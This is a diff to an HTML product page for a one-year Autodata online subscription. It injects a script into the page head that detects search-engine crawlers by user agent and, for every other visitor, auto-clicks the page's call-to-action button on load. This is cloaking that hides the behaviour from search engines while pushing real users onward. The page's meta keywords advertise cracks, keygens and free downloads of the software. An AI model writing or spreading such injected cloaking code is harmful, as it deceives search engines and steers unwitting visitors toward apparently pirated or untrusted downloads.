@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Autodata online for 1 year D&amp;R kit Eng</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Autodata Online provides diagnostic and repair info for 1 year, including wiring diagrams, in English for 45,000 models.">
     <meta name="keywords" content="Autodata online for 1 year, Autodata online 1 year subscription, Autodata D&amp;R kit Eng, Autodata online diagnostic software, Autodata online repair manual, Autodata online diagnostic software download, Autodata online repair manual download, Autodata online diagnostic software free download, Autodata online repair manual free download, Autodata 2023, Autodata online 2023 free download, Autodata technical information, Vehicle servicing software, Vehicle repair diagnostics, Technical information for vehicles, Autodata models, Automotive repair manuals, Automotive diagnostics solution, Autodata parts catalogs, Autodata special equipment repair, Atlas Copco repair manual, Bobcat service tool, Caterpillar diagnostics software, JCB technical information, Cummins repair catalog, Autodata free download, Autodata free installer, Autodata free download installer, Autodata free access, Autodata diagnostic software crack, Autodata diagnostic software keygen, Autodata online diagnostic software Eng, Autodata online diagnostic software download Eng, Autodata online diagnostic software free download Eng, Autodata online, Autodata online repair manual Eng, Autodata online repair manual free download Eng, Autodata online diagnostic software keygen Eng, Autodata diagnostic software, Автодата онлайн на 1 год, Автодата онлайн годовая подписка, Автодата диагностическое ПО, Автодата ремонтные руководства скачать, Автодата диагностическое ПО скачать бесплатно, Автодата программы для сервиса скачать бесплатно, Autodata скачати, Autodata онлайн діагностичне програмне забезпечення, Autodata ремонтне керівництво завантажити безкоштовно, Autodata сервісні програми завантажити безкоштовно">
     <style>
